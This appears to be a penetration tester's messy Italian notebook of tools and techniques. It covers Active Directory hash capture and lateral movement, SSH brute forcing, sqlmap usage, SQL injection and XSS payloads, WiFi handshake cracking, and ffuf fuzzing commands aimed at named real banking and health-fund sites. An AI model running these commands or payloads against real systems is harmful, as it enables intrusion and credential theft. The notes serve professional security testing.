

```
1. ProxyFire / Frida 
    
2. Man in the middle 
    
3. Configurare ssh server 
    
4. Argon2id  o Shadow56 per salvare password 
    
5. OpenVPN – VPN 
    
6. Encoding: ASCII, Base64, UTF-8, etc 
    
7. Creare una key ssh, iniettarla e memorizzarla su un server ssh 
    
8. MultiLAN, Multi Switch, Rete 
    
9. Integrare da appunti reti di calcolatori parte di IMAP, POP3, SMTP 
    
10. JWT password 
    
11. Virtualization/Sanbox bene 
    
12. Single signe on + identity provider login 
    
13. Auth0 – accesso token logout/login 
    
14. Shared/pref Cartella accesibile solo ai root o all'applicazione in cui possono essere salvate. Di defualt l'app utilizzata il data/data/shared/pref per salvare alcuni dati utilizzati dall'app e accisibili solo all'app e ai root. 
    
15. requestLegacyExternalStorage: Flag usato per scrivere sullo storage condiviso, o solo quello riservato all'APP Storage/Emulated è  lo storage esterno sul quale se il flag è statto erroneamente vengono scritti i log. 
    
16. Router Spoofing 
    
17. Rpcclient + lsaquery 
    
18. Ssh -R 
    
19. Dnspy 
    
20. Process explorer 
    
21. Snap -> package manager 
    
22. Scrcpy -> Tools emulatore 
    
23. WADB  
    
24. View -> vim not writable mode 
    
25. Burp -> unpack rcompreessed reqeusts 
    
26. MsSQL - cr: xp dirtree, monto una shell su una kali esterna e ti sei autenticato su quella shell per catturare l'hash 
    
27. XP Command Shell: Abilito il xp command shell  cmdshell comando macchina 
    

Guardare in che caso viene verificato il CORS. 

Guardare [https://cognito-idp.eu-central-1.amazonaws.com/](https://cognito-idp.eu-central-1.amazonaws.com/) 

Segnarsi impersonificare token 

list-tokens meterpreter 

rivedere cors per bene in dettaglio 

  

28. Ricerca utenze di dominio (SMB + RPC) - Interno Cerco macchine che consentono l'enumerazione degli utenti di dominio tramite sessione nulla. Rpcclient + LSAQUERY Uso il SID del dominio recuperati, per fare un RPC + LOOKUPSIDS per enumerare gli utenti utilizzando il SID xxx recuperato prima + "-500" riservato alla prima utenza amministrativa sul domain controller. Procedo all'enumerazione sul SID sulla speifica macchina  
    
29. POODLE : In un attacco POODLE (Padding Oracle on Downgraded Legacy Encryption), l'aggressore intercetterà la connessione tra il tuo browser e un server web. Quindi forzeranno il tuo browser a eseguire il downgrade del protocollo di sicurezza del server a SSL 3.0 da TLS 1.0 per rubare le tue informazioni riservate.  
    
30. Ping Sweep: 
    
31. XMLRPC 
    
32. Memoria Swap vs History retrieve content 
    
33. MSS SQL – Derb Tree 
    
34. Risoluzione DNS Androdi Private DNS 
    
35. Differenza HTTPS 
    
36. LSA with SAM Security account manager (account per gestire le password) 
    
37. Linux Active Directory 
    
38. Nfs 
    
39. Syn Version vs Syn Connect 
    
40. Ms sql db - vulnerbailità shell interattiva administrator 
    
41. LDAP vulnerabilities stampanti 
    
42. - default page administrtor, jboss, apache, nxginx 
    
43. - Metasploit Exploit per ogni web server/applicatin server es. jboss jmx-console. 
    
44. - IPMI  
    
45. [https://github.com/joaomatosf/jexboss](https://github.com/joaomatosf/jexboss) -> Sfrutta vulnerability Apache Tomcat / JBoss EJBInvokerServlet / JMXInvokerServlet Multiple Vulnerabilities... Eseguo la reverse shell su una porta che so sia sempre aperta, es. La 53 UDP 
    
46. Nt authorities (windows) == root (linux) 
    
47. MultiTCP ferrovie  
    
48. - /cgi/json-req 
    
49. Accesso a funzionalità disabilitate tramite manipolazione del codice Javascript. La GUI di amministrazione del dispositivo risulta avere alcune funzionalità disabilitate di default tramite l'attributo disabled="disabled" di javascript. Un utente con accesso a tale interfaccia risulta in grado di modificare lato client tale attributo ed utilizzare tali funzionalità come ad esempio: GPON. Alcune di queste funzionalità sono in grado di modificare la configurazione del dispositivo. Si raccomanda di effettuare la sanificazione dell'interfaccia GUI del dispositivo lasciando accessibili solo le funzionalità volute. MEDIUM 
    
50. - FragAttack 
    
51. - Acunetix, Netsparker: tools automatici di WAVA Automatic Security Analysis come  
    
52. - etc/shadow: Cartella con hash pass  
    
53. - wafw00f 
    

Tools per fare discovery del WAF. 

04/09/2023 

- defender, malwarebytes e nod32 

- httpop: tools interno scansioni automatizzate per recuperare web esposto.  

- nessus arp recuperareuest risoluzione 

- default page administrtor, jboss, apache, nxginx 

- Metasploit Exploit per ogni web server/applicatin server es. jboss jmx-console. 

- IPMI  

- LDAP vulnerabilities stampanti 

54. Dalfox 
    
55. Tools automatizzati per effettuare attacchi XSS, SQLMap -> xsser 
    
56. Nikto –host 
    
57. LinPEAS 
    
58. - Airodump: catturi gli handshake 
    
59. - Aireplay: Deauthentication utente 
    
60. - Aircrack: Crack password handshake 
    

uardare in che caso viene verificato il CORS. 

Guardare [https://cognito-idp.eu-central-1.amazonaws.com/](https://cognito-idp.eu-central-1.amazonaws.com/) 

Segnarsi impersonificare token 

list-tokens meterpreter 

rivedere cors per bene in dettaglio 

61. Rinetd -> IP Table Rule 
    

curlconvert javascript / xml 

Setting VM: bcdedit /set hypervisorlaunchtype off 

Also disable memory integrity from core isolation. 

`Windows Security -> Device Security -> Core Isolation details` 

Per riattivarlo: bcdedit /set hypervisorlaunchtype auto 

 requestLegacyExternalStorage: 

Flag usato per scrivere sullo storage condiviso, o solo quello riservato all'APP 

allowBackup: 

Deve essere a false, per non fare il backup dei dati utente 

signlesignon 

rootDetection: 

Non permettere l'esecuzione a dispostivi rootati 

- Task Hijacking 

Task affinity control 

Launch Mode: Single Task Mode (Singla Istance) 

Task reparenting 

https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting/android-task-hijacking 

------------------------------------- 

.xxx00000 

93.147.164.0 

93.147.164.31 

0  Network 

31 Broadcast 

traduzione prox 6.207 

************************* 

(1) rpcclient -U 'lsaquery' 

(2) rpcclient -U 'lookupsids +SID' 

Step Interno: 

- RCP per provare ad accedere a qualche share di rete con sessione nulla 

- RPC per provare a enumerare gli utenti tramite sessione nulla tramite LSAQUERY recupero i candidati che rispondono indicandomi il Dominio SID 

- RPC di tipo LookupSIDS per provare ad enumerare gli utenti amministratori del target del dominio (500 è riservato ala prima utenza amministrativa) 

  Sostanzialmente provo ad usare il dominio-500 per enumerare gli utenti per tutti i target 

- RPC di tipo lookupsids enumerando tutti gli utenti utilizzando SID dominio-1000 a 3000 

da etc/semb.conf è possibile eliminare la configurazione. 

Utilizzi le utenze estratte per fare attacchi a dizionario 

************************* 

In parallelo uso responder.py, per sfruttare LLMNR, NBT-NS effettuando poisoning della rete. 

Hash NTLMv2 crack -> hashcat 

Uso crackmapexec + smb per eseguire scansioni e recuperare delle share al quale è possibile accedere tramite credenziali estratte in precedenza.. 

Utilizzi versioni obsolete per sfruttare vulnerabilità conosciute come Bluekeep (utilizzando msf6 Metasploit) 

swap vs history 

Differenza: 

1. Crackmapex vs Meterpreter 

2. sva-smb vs Crackmapex 

3.  

---------------------------------------------------------------- 

04/09/2023 

- defender, malwarebytes e nod32 

- httpop: tools interno scansioni automatizzate per recuperare web esposto.  

- nessus arp recuperareuest risoluzione 

- default page administrtor, jboss, apache, nxginx 

- Metasploit Exploit per ogni web server/applicatin server es. jboss jmx-console. 

- IPMI  

- LDAP vulnerabilities stampanti 

-  

Vulnerabilità Interno da guardare: 

- Apache Tomcat / JBoss EJBInvokerServlet / JMXInvokerServlet Multiple Vulnerabilities 

- Eternal Blue: SMB Vulnerabilities Code 

- password comuni: admin:blank / anonymous:anonymous / admin:admin 

- Amministratore di dominio, Amministratore locale, amministratore di dominio, utente locale,  

- medusa -M ssh -u root -P diz -H 22.txt -T 10 -t 10 -> Tools automatizzato 

- grep 'open.*ssh' *.nmap -B10 | grep 'report for' | cut -d " " -f 5 

- Diff amministratore locale vs di dominio 

- SAM -> hash dell'amministratore locale 

- LSA -> hash Domain Controller ntds.dit è il file contentne gli hash di tutti gli utenti del dominio 

- NT Authority (Windows) == Root (Linux) 

- Debugging Javascript from Console -> https://developer.chrome.com/docs/devtools/javascript/ 

-  

Interno: 

L'obiettivo è diventare amministratore di dominio. 

Cerchi un modo per ottenere l'hash NTLMv2 o le credenziali in chiaro di un utente. 

Con le crendenziali di un utente (token kerberos / hash NTLMv2 / pass) provi a vedere tramite tools come crackmapexec se è possibile accedere a share di rete, e all'interno di queste provi a vedere se nella memoria si trovano hash/pass, che possono essere utili a loro volta per autenticarsi in altre share, con l'obiettivo di recuperare hash/pass di un amministratore di dominio. 

es. crackmapexec smb 192.168.0.0/24 -d v2.local -u Administrator -p "Hash/Password" 

SQLMap: 

sqlmap -u: url 

sqlmap --batch: use default option 

sqlmap --dump: Estrarre anche i dati 

sqlmap --crawl, --forms or -g : autmatic parameter finding 

sqlmap --data: POST Method -> sqlmap 'http://www.example.com/' --data 'uid=1&name=test' 

sqlmap --data 'uid=1*&name=test' -> * indica che solo questo parametro deve essere soggetto a sqlmap, utile per centralizzare il tools su specifici parametri. 

sqlmap -r : SQLMap with an HTTP request file, we use the -r flag 

sqlmap --cokie:'PHPSESSIONID=asdsad' Specifica cookie oppure -H = 'Cookie: PHPSESSIONID=asdsad' 

sqlmap --random-agent: Random useragent 

sqlmap --mobile: UserAgent smartphone 

sqlmap --method PUT : sqlmap -u www.target.com --data='id=1' --method PUT 

sqlmap  

');WAITFOR+DELAY+'0:0:5'-- 

'%3bWAITFOR+DELAY+'0%3a0%3a5'-- 

https://www.fondosanitariointegrativogruppointesasanpaolo.it/Portale_FSI/PDF/Sicurezza/Modulo_aggiornamento_indirizzo_e_mail.pdf 

https://www.fondosanitariointegrativogruppointesasanpaolo.it/Portale_FSI//PDF//HomePage/LTC/Convenzione_LTC.pdf 

curl 'http://94.237.59.206:43685/case3.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3' -H 'Accept-Encoding: gzip, deflate' -H 'Connection: keep-alive' -H 'Referer: http://94.237.59.206:43685/' 'Cookie: id=1' -H 'Upgrade-Insecure-Requests: 1' 

curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@tua_pagina.jsp" http://localhost:8080/tuo-progetto-web/nuova_pagina.jsp 

, 

            {  

                "comment":"Disable browser XSS protection", 

                "enabled":false, 

                "is_simple_match":true, 

                "rule_type":"response_header", 

                "string_replace":"X-XSS-Protection: 0" 

            } 

https://www.fideuramonline.it/scriptWeb20/vetrina/contentData/view/fideuram-attivazione_6.pdf?id=CNT-05-0000000532FB8&ct=application/pdf 

etbi5c7wj7cb07l060lhu75mhdn4bzzo.oastify.com 

ffuf -w ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u https://www.fondosanitariointegrativogruppointesasanpaolo.it/Portale_FSI/Public/HomePage/FUZZ -ic -mc 200 -rate 10 

ffuf -w ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u https://www.fideuramonline.it/script/ServiceLogin/ib/offline/FUZZ -ic -mc 200 -rate 10 

ffuf -w ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u https://www.fideuramonline.it/script/Servizi?funzione=FUZZ -ic -mc 200 -rate 10 

ffuf -w ~/Desktop/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u https://FUZZ.www.fondosanitariointegrativogruppointesasanpaolo.it/Portale_FSI/Public/HomePage/ -ic -mc 200 -rate 5 

ffuf -w ~/Desktop/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u https://FUZZ.www.fideuramonline.it -ic -mc 200 -rate 10 

ffuf -w ~/Desktop/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u https://www.fondosanitariointegrativogruppointesasanpaolo.it/Portale_FSI/Public/HomePage -ic -mc 200 -rate 10 -H 'Host: www.FUZZ.www.fondosanitariointegrativogruppointesasanpaolo.it/Portale_FSI/Public/HomePage' 

ffuf -w ~/Desktop/SecLists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u https://www.fideuramonline.it -ic -mc 200 -rate 10 -H 'Host: FUZZ.www.fideuramonline.it' 

ffuf -w ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u https://www.fideuramonline.it/script/ServiceLogin/ib/FUZZ -ic -mc 200 --rate 10 

ffuf -w ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u https://www.fideuramonline.it/script/ServiceLogin/ib/login/FUZZ -ic -mc 200 -rate 10 

ffuf -w ~/Desktop/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u www.fideuramonline.it/scriptWeb20/vetrina/fideuram/nop/ita/assistenza/ita_assistenza.jsp?cod=FUZZ -ic -mc 200 -rate 5  

oltre a header 

Oltre a configurazioni sugli header che potrebbero migliorare il livello di sicurezza (X-Frame per ClickJacking), versione di jQuery obsoleta non ho trovato molto altro 

/script/rest/bt/pilota/attivo/funzione/CLONE_CHIUSO/01025/00000000 

- Rootkittato fastboot unlock fast boot anche da gui non c'è la funzione bios, firmware estratto boodimage rootkittata, rifleshato ma il secure boot la firma non è invalida, mm unlock non puoi disattivarlo 

- /cgi/json-req 

Accesso a funzionalità disabilitate tramite manipolazione del codice Javascript. La GUI di amministrazione del dispositivo risulta avere alcune funzionalità disabilitate di default tramite l'attributo disabled="disabled" di javascript. Un utente con accesso a tale interfaccia risulta in grado di modificare lato client tale attributo ed utilizzare tali funzionalità come ad esempio: GPON. Alcune di queste funzionalità sono in grado di modificare la configurazione del dispositivo. Si raccomanda di effettuare la sanificazione dell'interfaccia GUI del dispositivo lasciando accessibili solo le funzionalità volute. MEDIUM 

- FragAttack 

- Acunetix, Netsparker: 

tools automatici di WAVA Automatic Security Analysis come 

- etc/shadow: 

Cartella con hash pass 

- wafw00f 

Tools per fare discovery del WAF 

- Da provare per domani fondosanitariointegrativogruppointesasanpaolo richiamando la request enza il Cookie visto che in una di quelle reindirizzava in altri path. 

- Provare Race Condition 

- Verificare se è implementato il CORS 

- https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped  

- https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored 

-  

<style> 

    iframe { 

        position:relative; 

        width:$width_value; 

        height: $height_value; 

        opacity: $opacity; 

        z-index: 2; 

    } 

    div { 

        position:absolute; 

        top:$top_value; 

        left:$side_value; 

        z-index: 1; 

    } 

</style> 

<div>Test me</div> 

<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe> 

--> <img src=1 onerror=alert(1) <!-- 

- boot e carica il bios 

-  

Vulnerabilità Interno da guardare: 

- Apache Tomcat / JBoss EJBInvokerServlet / JMXInvokerServlet Multiple Vulnerabilities 

- Eternal Blue: SMB Vulnerabilities Code 

- password comuni: admin:blank / anonymous:anonymous / admin:admin 

- Amministratore di dominio, Amministratore locale, amministratore di dominio, utente locale,  

- medusa -M ssh -u root -P diz -H 22.txt -T 10 -t 10 -> Tools automatizzato 

- grep 'open.*ssh' *.nmap -B10 | grep 'report for' | cut -d " " -f 5 

- Diff amministratore locale vs di dominio 

- SAM -> hash dell'amministratore locale 

- LSA -> hash Domain Controller ntds.dit è il file contentne gli hash di tutti gli utenti del dominio 

- NT Authority (Windows) == Root (Linux) 

- Debugging Javascript from Console -> https://developer.chrome.com/docs/devtools/javascript/ 

-  

Interno: 

L'obiettivo è diventare amministratore di dominio. 

Cerchi un modo per ottenere l'hash NTLMv2 o le credenziali in chiaro di un utente. 

Con le crendenziali di un utente (token kerberos / hash NTLMv2 / pass) provi a vedere tramite tools come crackmapexec se è possibile accedere a share di rete, e all'interno di queste provi a vedere se nella memoria si trovano hash/pass, che possono essere utili a loro volta per autenticarsi in altre share, con l'obiettivo di recuperare hash/pass di un amministratore di dominio. 

es. crackmapexec smb 192.168.0.0/24 -d v2.local -u Administrator -p "Hash/Password" 

    Attività secondarie/Conferme  

62. Crack Windows USB 
    
63. Crack Windows con Linux Live + Modifica disco 
    
64. Balena Etcher - Flash OS Images into USB drives 
    
65. WiFi Topic Attack : Wifite, airmoon, airdrop, wifi scanner, Fragattack WiFi Vulnerability, Pixie-Dust, Null Pin, Pin Attack, Hadshake capture, Fragattack  
    
66. Come Passarsi file dalla WLAN/LAN 
    
67. Javascript source mapper (librerie js espongono il .map) 
    
68. Lux? Crittografia   
    
69. Luak di rete: Nessuna Fonte - deve essere disattivato luack di rete che impedisce di inviare comandi anche se sei amministratore, c'è il wak di rete. 
    
70. Pollista 
    
71. Wordlistsandleaks 
    
72. Blood Hunt
```